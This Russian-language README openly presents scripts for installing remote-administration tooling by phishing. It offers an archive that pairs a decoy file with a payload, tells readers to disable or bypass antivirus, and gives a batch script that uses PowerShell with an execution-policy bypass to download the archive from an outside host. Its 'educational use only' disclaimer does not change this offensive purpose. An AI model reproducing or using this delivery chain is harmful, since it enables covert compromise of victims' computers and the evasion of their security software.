# Загрузка файлов

**Внимание!!!** Антивирусы могут определять этот набор скриптов как
содержащие вирус. Запускайте скрипты при отключённом антивирусе или
добавьте исключения антивируса.

Данный каталог содержит набор скриптов для установки админ-пака методом фишинга.

На этой странице предлагается загрузка следующих файлов:

- [mainexample.zip](http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/download.php?file=mainexample.zip)
  — Архив, содержащий отвлекающий файл и полезную нагрузку. **Внимание!!!**   Данный файл не защищён паролем, поэтому при его загрузке активные антивирусы его сразу же уничтожают. Вначале добавте исключения в ваш антивирус или отключите антивирус во время загрузки и запуска файла!

Файлы реализуют различные функции на удалённом компьютере.

## Загрузка файлов из командной строки (универсальный вариант)

**Примечание**. Переменная *%WorkingDir%* должна обязательно указывать на папку «Загрузки» пользователя. По умолчанию она располагается в %USERPROFILE%\Downloads. Если это не так, вручную изменить данную инструкцию. Из-за ограничений командной строки авторы не могут использовать скрипт для определения истинного положения папки «Загрузки».

Покомандно, последовательно выполните следующий скрипт:

```bash
@echo on
rem *******************************************************
rem nit-silentinstall.mainexample.scripts.download.cmd
rem This Script will Download an Archive
rem *******************************************************
@echo off

rem Set Variables
rem

rem Set a Directory
set WorkingDir=%USERPROFILE%\Downloads
set anURLDir=http://distrib.netip6.ru/NIT/NIT-SilentInstalls/MainExample/

set aFile=mainexample.zip

rem Run payload
powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command ^
"((new-object System.Net.WebClient).DownloadFile('%anURLDir%%aFile%', '%WorkingDir%\%aFile%'))"

```

После загрузки файлов распакуйте архив, и выполните действия, описанные в инструкции. 

*Внимание!* Здесь приведены только скрипты загрузки архивов. Для их распаковки и запуска скриптов может потребоваться графическая оболочка.

## Замечания о применении скрипта

Используйте данный скрипт только в образовательных, некоммерческих целях! Любое злонамеренное использование данной программы преследуется по закону!

## Лицензия

Данная программа и сопутствующие скрипты распространяются под лицензией GNU GPLv3.

